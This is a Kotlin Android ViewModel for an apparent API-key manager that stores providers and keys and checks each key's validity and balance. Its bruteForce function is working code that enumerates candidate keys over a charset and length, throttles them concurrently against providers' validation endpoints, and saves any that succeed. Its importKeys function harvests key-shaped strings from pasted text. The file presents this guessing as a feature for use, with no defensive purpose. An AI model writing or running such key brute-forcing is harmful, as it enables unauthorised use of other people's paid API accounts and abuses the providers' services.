package com.apikey.parser.vm

import android.app.Application
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.apikey.parser.data.model.ApiKey
import com.apikey.parser.data.model.Provider
import com.apikey.parser.data.net.Api
import com.apikey.parser.data.store.Store
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.sync.Semaphore

class AppViewModel(app: Application) : AndroidViewModel(app) {
    private val store = Store(app)
    private val api = Api()
    private val _state = MutableStateFlow(store.load())
    val state: StateFlow<com.apikey.parser.data.model.AppState> = _state.asStateFlow()

    fun persist() { store.save(_state.value) }

    fun addProvider(name: String, baseUrl: String) {
        val p = Provider(name = name, baseUrl = baseUrl)
        _state.value = _state.value.copy(providers = _state.value.providers + p)
        persist()
        viewModelScope.launch {
            val ex = api.findKeyExample(baseUrl)
            if (ex != null) updateProvider(p.id) { it.copy(keyExample = ex, keyTemplate = ex) }
        }
    }

    fun updateProvider(id: String, transform: (Provider) -> Provider) {
        _state.value = _state.value.copy(providers = _state.value.providers.map { if (it.id == id) transform(it) else it })
        persist()
    }

    fun removeProvider(id: String) {
        _state.value = _state.value.copy(
            providers = _state.value.providers.filter { it.id != id },
            keys = _state.value.keys.filter { it.providerId != id }
        )
        persist()
    }

    fun addKey(providerId: String, key: String, label: String = "") {
        val k = ApiKey(providerId = providerId, key = key, label = label)
        _state.value = _state.value.copy(keys = _state.value.keys + k)
        persist()
        validateKey(k.id)
    }

    fun removeKey(id: String) {
        _state.value = _state.value.copy(keys = _state.value.keys.filter { it.id != id })
        persist()
    }

    fun toggleFavorite(id: String) {
        _state.value = _state.value.copy(keys = _state.value.keys.map { if (it.id == id) it.copy(favorite = !it.favorite) else it })
        persist()
    }

    fun validateKey(id: String) {
        val k = _state.value.keys.find { it.id == id } ?: return
        val p = _state.value.providers.find { it.id == k.providerId } ?: return
        viewModelScope.launch {
            val (ok, models) = api.validateKey(p.baseUrl, k.key)
            val bal = if (ok) api.fetchBalance(p.baseUrl, k.key) else null
            _state.value = _state.value.copy(keys = _state.value.keys.map {
                if (it.id == id) it.copy(
                    status = if (ok) "valid" else "invalid",
                    models = models,
                    balance = bal ?: it.balance,
                    lastChecked = System.currentTimeMillis()
                ) else it
            })
            persist()
        }
    }

    fun validateAll() {
        _state.value.keys.forEach { validateKey(it.id) }
    }

    fun setTheme(index: Int) {
        _state.value = _state.value.copy(themeIndex = index)
        persist()
    }

    fun setLanguage(lang: String) {
        _state.value = _state.value.copy(language = lang)
        persist()
    }

    fun importKeys(providerId: String, text: String) {
        val p = _state.value.providers.find { it.id == providerId } ?: return
        val template = p.keyExample ?: p.keyTemplate
        val regex = template?.let { t ->
            // build a loose regex from example: replace alphanumerics with \w
            val r = t.map { c -> if (c.isLetterOrDigit()) "\\w" else Regex.escape(c.toString()) }.joinToString("")
            Regex(r)
        }
        val candidates = if (regex != null) regex.findAll(text).map { it.value }.toList() else {
            Regex("[A-Za-z0-9_\\-]{16,}").findAll(text).map { it.value }.toList()
        }
        candidates.distinct().forEach { addKey(providerId, it) }
    }

    fun bruteForce(providerIds: List<String>, charset: String, length: Int, onFound: (String, String) -> Unit, onProgress: (Int, Int, String) -> Unit, onDone: () -> Unit) {
        val providers = _state.value.providers.filter { it.id in providerIds }
        if (providers.isEmpty() || charset.isEmpty() || length <= 0) { onDone(); return }
        val chars = charset.toList()
        val estimated = Math.pow(chars.size.toDouble(), length.toDouble())
        val cap = 200000
        val total = estimated.toInt().coerceAtMost(cap)
        viewModelScope.launch {
            for (p in providers) {
                val sem = kotlinx.coroutines.sync.Semaphore(_state.value.concurrency.coerceAtLeast(1))
                val indices = IntArray(length)
                var hasMore = true
                var count = 0
                val batch = mutableListOf<String>()
                val batchSize = (_state.value.concurrency.coerceAtLeast(1) * 4).coerceAtMost(64)
                while (hasMore && count < total) {
                    batch.clear()
                    repeat(batchSize) {
                        if (count + batch.size >= total) return@repeat
                        batch.add(indices.map { chars[it] }.joinToString(""))
                        // advance odometer
                        var pos = length - 1
                        while (pos >= 0) {
                            indices[pos]++
                            if (indices[pos] < chars.size) break
                            indices[pos] = 0
                            pos--
                        }
                        if (pos < 0) { hasMore = false }
                    }
                    if (batch.isEmpty()) break
                    val currentBatch = batch.toList()
                    val jobs = currentBatch.map { cand ->
                        kotlinx.coroutines.async {
                            sem.acquire()
                            try {
                                val (ok, _) = api.validateKey(p.baseUrl, cand)
                                if (ok) {
                                    addKey(p.id, cand, "bruteforce")
                                    onFound(cand, p.name)
                                }
                            } finally { sem.release() }
                        }
                    }
                    jobs.awaitAll()
                    count += currentBatch.size
                    onProgress(count, total, p.name)
                }
            }
            onDone()
        }
    }
}
